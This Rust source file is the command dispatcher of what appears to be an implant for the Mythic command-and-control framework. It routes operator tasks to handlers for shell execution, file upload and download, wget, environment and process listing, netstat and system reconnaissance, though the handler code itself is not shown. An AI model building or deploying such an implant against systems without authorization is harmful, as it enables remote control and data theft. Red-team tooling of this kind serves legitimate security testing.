#[path = "commands/cat.rs"]
mod cat;
#[path = "commands/cp.rs"]
mod cp;
#[path = "commands/download.rs"]
mod download;
#[path = "commands/env.rs"]
mod env;
#[path = "commands/exit.rs"]
mod exit;
#[path = "commands/ls.rs"]
mod ls;
#[path = "commands/mkdir.rs"]
mod mkdir;
#[path = "commands/mv.rs"]
mod mv;
#[path = "commands/netstat.rs"]
mod netstat;
#[path = "commands/ps.rs"]
mod ps;
#[path = "commands/resolve.rs"]
mod resolve;
#[path = "commands/rm.rs"]
mod rm;
#[path = "commands/shell.rs"]
mod shell;
#[path = "commands/sleep.rs"]
mod sleep;
#[path = "commands/sysinfo.rs"]
mod sysinfo;
#[path = "commands/upload.rs"]
mod upload;
#[path = "commands/wget.rs"]
mod wget;
#[path = "commands/whoami.rs"]
mod whoami;

use mythic::{TaskMessage, TaskResponse};

/// Route any command to its handler.
pub fn dispatch(task: &TaskMessage) -> TaskResponse {
    match task.command.as_str() {
        "cat" => cat::handle(task),
        "cp" => cp::handle(task),
        "download" => download::handle(task),
        "env" => env::handle(task),
        "exit" => exit::handle(task),
        "ls" => ls::handle(task),
        "mkdir" => mkdir::handle(task),
        "mv" => mv::handle(task),
        "netstat" => netstat::handle(task),
        "ps" => ps::handle(task),
        "resolve" => resolve::handle(task),
        "rm" => rm::handle(task),
        "shell" => shell::handle(task),
        "sleep" => sleep::handle(task),
        "sysinfo" => sysinfo::handle(task),
        "upload" => upload::handle(task),
        "wget" => wget::handle(task),
        "whoami" => whoami::handle(task),
        unknown => TaskResponse::failed(task.id, &format!("unknown command: {unknown}")),
    }
}
